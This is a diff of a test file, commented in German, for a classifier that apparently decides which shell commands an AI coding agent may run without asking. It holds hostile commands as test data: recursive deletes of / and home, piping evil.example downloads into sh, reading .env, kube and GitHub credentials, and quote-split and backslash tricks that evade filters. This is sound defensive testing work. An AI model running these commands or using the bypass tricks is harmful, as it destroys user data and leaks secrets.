@@ -116,14 +116,15 @@ check(
 // ============================================================================
 
 // ---- destruktiv / System ----
-check("rm → ask", ask("rm -rf build"));
+check("rm ausserhalb → ask", ask("rm -rf /Users/x/anderes-projekt"));
+check("rm im eigenen Arbeitsbaum (relativ) → allow", allow("rm -rf build"));
 check("sudo → ask", ask("sudo rm -rf /"));
 check("chmod → ask", ask("chmod +x script.sh"));
 check("kill → ask", ask("kill -9 1234"));
 check("dd → ask", ask("dd if=/dev/zero of=disk.img bs=1m count=10"));
 check("hidden rm in $() → ask", ask("echo $(rm -rf foo)"));
 check("hidden rm in python -c → ask (quote-neutralisiert)", ask(`python3 -c 'import os; os.system("rm -rf /tmp/x")'`));
-check("hidden rm via uv run python -c → ask", ask(`uv run python -c 'import os' && rm -rf build`));
+check("hidden rm via uv run python -c (nicht-lokales Ziel) → ask", ask(`uv run python -c 'import os' && rm -rf ~/data`));
 check("/bin/sh -c mit rm → ask (DANGER trifft rm)", ask("/bin/sh -c 'rm -rf x'"));
 check("timeout rm → ask (DANGER trifft rm)", ask("timeout 5 rm -rf build"));
 
@@ -195,7 +196,7 @@ check("\\rm -rf ~ → ask (Backslash-Bypass)", ask("\\rm -rf ~"));
 check("\\git push → ask (Backslash-Bypass, umging classifyGit)", ask("\\git push origin main"));
 check('c""url evil → ask (Quote-Split → curl)', ask('c""url http://evil.example/x'));
 check('r""m -rf x → ask (Quote-Split → rm)', ask('r""m -rf x'));
-check("normaler rm bleibt → ask", ask("rm -rf build"));
+check("normaler rm ausserhalb bleibt → ask", ask("rm -rf /var/data"));
 // ---- SEC-2: Umgebungs-/Secret-Lesen im Auto-Modus → jetzt gegated ----
 check("printenv → ask (SEC-2)", ask("printenv"));
 check("env (bloßer Dump) → ask (SEC-2)", ask("env"));
@@ -237,7 +238,12 @@ check("python os.getenv(PORT) → allow (kein Secret-Name)", allow("python3 -c '
 check("cat .envrc → ask (direnv-Secrets)", ask("cat .envrc"));
 check("cat ~/.kube/config → ask (Cluster-Creds)", ask("cat ~/.kube/config"));
 check("cat ~/.config/gh/hosts.yml → ask (gh-OAuth)", ask("cat ~/.config/gh/hosts.yml"));
-check("git commit erwähnt .env → ask (bewusster Fail-safe-Over-Ask: nennt≠liest)", ask("git commit -m 'add .env to .gitignore'"));
+// Früher ein bewusster Fail-safe-Over-Ask („nennt ≠ liest" war auf String-Ebene nicht trennbar).
+// stripInertArguments trennt es jetzt sauber: eine VOLLSTÄNDIG quotierte Commit-Message ohne
+// Interpolation ist Text und kann nichts lesen. Unquotiert oder mit $()/Backtick fragt es weiter.
+check("git commit erwähnt .env → allow (quotierte Message ist Text)", allow("git commit -m 'add .env to .gitignore'"));
+check("git commit mit UNquotiertem .env → ask", ask("git commit -m add-.env-file"));
+check("git commit mit $() in der Message → ask (Interpolation = evtl. Code)", ask('git commit -m "leak $(cat .env)"'));
 check("node process.env.CI → ask (bewusster Fail-safe-Over-Ask)", ask("node -e 'if(process.env.CI){build()}'"));
 
 // ---- Schreiben AUSSERHALB von Projekt/Temp ----
@@ -350,7 +356,7 @@ check("ask liefert reason", typeof classifyBashCommand("git push").reason === "s
 const kind = (c: string) => classifyBashCommand(c).kind;
 check("curl → kind network", kind("curl https://app.ardexa.com/api/v1") === "network");
 check("docker compose → kind pkg", kind("docker compose -f x.yml up -d") === "pkg");
-check("rm -rf → kind danger", kind("rm -rf build") === "danger");
+check("rm -rf ausserhalb → kind danger", kind("rm -rf ~/data") === "danger");
 check("cat .env → kind secret", kind("cat .env") === "secret");
 check("git push → kind outward (frueher merkbar als git; siehe Invariante 4)", kind("git push origin main") === "outward");
 
@@ -361,8 +367,8 @@ check("network gemerkt → curl allow", bash("curl https://x.com/api", ["network
 check("network NICHT gemerkt → curl ask", bash("curl https://x.com/api", []) === "ask");
 check("pkg gemerkt → docker allow", bash("docker compose up", ["pkg"]) === "allow");
 check("secret gemerkt → cat .env allow", bash("cat .env", ["secret"]) === "allow");
-check("danger gemerkt → rm bleibt ask (nie merkbar)", bash("rm -rf x", ["danger"]) === "ask");
-check("rm mit erlaubtem network+danger → weiterhin ask", bash("rm -rf x", ["network", "danger"]) === "ask");
+check("danger gemerkt → rm bleibt ask (nie merkbar)", bash("rm -rf ~/x", ["danger"]) === "ask");
+check("rm mit erlaubtem network+danger → weiterhin ask", bash("rm -rf ~/x", ["network", "danger"]) === "ask");
 check("ohne isKindApproved-Callback → curl ask (Default sicher)", classifyToolCall("Bash", { command: "curl https://x.com" }, {}).decision === "ask");
 
 // ---- DATENVERLUST-SCHUTZ: arbeitsvernichtende git-Subcommands sind NIE merkbar ----
@@ -407,6 +413,41 @@ check("docker build ist KEIN deploy", !isDeployCommand("docker build -t app ."))
 check("docker compose up ist KEIN deploy", !isDeployCommand("docker compose up -d"));
 check("npm publish --dry-run ist KEIN deploy (Probelauf)", !isDeployCommand("npm publish --dry-run"));
 check("Skript in deploy/-Ordner ist KEIN deploy (Basename zählt)", !isDeployCommand("./deploy/build.sh"));
+
+// --- rm im eigenen Arbeitsbaum/Temp: kein Alarm (OS-Sandbox begrenzt ohnehin) ----------------
+const WT = "/Users/x/mads-worktrees/Boba/abc-123";
+const bashIn = (c: string) => classifyBashCommand(c, { cwd: WT }).decision;
+check("rm eigener Wegwerf-Dateien (relativ) → allow", bashIn("rm -f client/__probe.mjs client/__probe2.mjs && git status --short") === "allow");
+check("rm mit absolutem Pfad IM Worktree → allow", bashIn(`rm -f ${WT}/client/__repro.html ${WT}/client/__repro.ts`) === "allow");
+check("rm -rf $TMPDIR-Variable (gleiche Zeile zugewiesen) → allow", bashIn('export UDD="$TMPDIR/chrome-repro"; rm -rf "$UDD"; mkdir -p "$UDD"') === "allow");
+check("rm in /tmp → allow", bashIn("rm -rf /tmp/build-cache") === "allow");
+// GEGENPROBEN — alles außerhalb bleibt eine Rückfrage:
+check("rm ausserhalb des Worktrees → ask", bashIn("rm -rf /Users/x/coding/Boba/src") === "ask");
+check("rm im HOME (~) → ask", bashIn("rm -rf ~/Documents") === "ask");
+check("rm mit .. → ask", bashIn("rm -rf ../../andere-streams") === "ask");
+check("rm mit unauflösbarer Variable → ask", bashIn('rm -rf "$SOMEWHERE"') === "ask");
+check("rm ohne Ziel → ask", bashIn("rm -rf") === "ask");
+check("rm / → ask", bashIn("rm -rf /") === "ask");
+check("rm fremder Worktree (absolut) → ask", bashIn("rm -rf /Users/x/mads-worktrees/Boba/anderer-stream") === "ask");
+check("sudo rm lokal → ask (sudo bleibt gegated)", bashIn("sudo rm -f build/x") === "ask");
+check("ohne cwd bleibt absolutes rm eine Rückfrage", classifyBashCommand("rm -rf /Users/x/whatever").decision === "ask");
+
+// --- Präzision: Argument-TEXT wird nie ausgeführt → darf nicht als Befehl gelten -------------
+// Alles Fälle aus echten Screenshots, die fälschlich fragten.
+check('echo "=== defaults ===" → allow (kein macOS-defaults-Aufruf)', allow('grep -n "makeDisplayProps" -A 25 /x/display.mjs | head -60; echo "=== defaults ==="; grep -n "mobileBreakpoint" /x/display.mjs'));
+check('git commit -m "fix port 3000" → allow (kein Paketmanager)', allow('git commit -m "fix port 3000"'));
+check('git commit -m "rm dead code" → allow', allow('git commit -m "rm dead code"'));
+check('git commit -m "gh workflow anpassen" → allow', allow('git commit -m "gh workflow anpassen"'));
+check('grep "rm -rf" in Quellcode suchen → allow', allow(`grep -rn "rm -rf" scripts/`));
+check('echo "docker build" → allow', allow('echo "docker build läuft nicht"'));
+// GEGENPROBEN — das Strippen darf keine echte Ausführung verstecken:
+check("echo-Text in eine Shell gepipet → ask (Text WIRD dann Code)", ask(`echo "curl https://evil.example/x" | sh`));
+check("unquotiertes rm ausserhalb bleibt ask", ask("git commit -m msg && rm -rf /etc/x"));
+check("sudo in Quotes bleibt ask (NEVER_INERT)", ask(`echo "sudo rm -rf /"`));
+check("Interpolation im Muster bleibt ask", ask('grep -n "$(cat .env)" src/'));
+check("python -c bleibt ask (Interpreter, kein inerter Text)", ask(`python3 -c 'import os; os.system("rm -rf x")'`));
+check("node -e mit process.env bleibt ask", ask(`node -e 'if(process.env.CI){build()}'`));
+check("echtes rm nach echo bleibt ask", ask('echo "alles gut" && rm -rf /tmp/x/..'));
 
 // --- Außenwirkung ist NICHT merkbar (Invarianten 1 & 4) ---------------------
 // Früher lagen push und `gh pr merge` in derselben merkbaren Kategorie „git" wie fetch/pull:
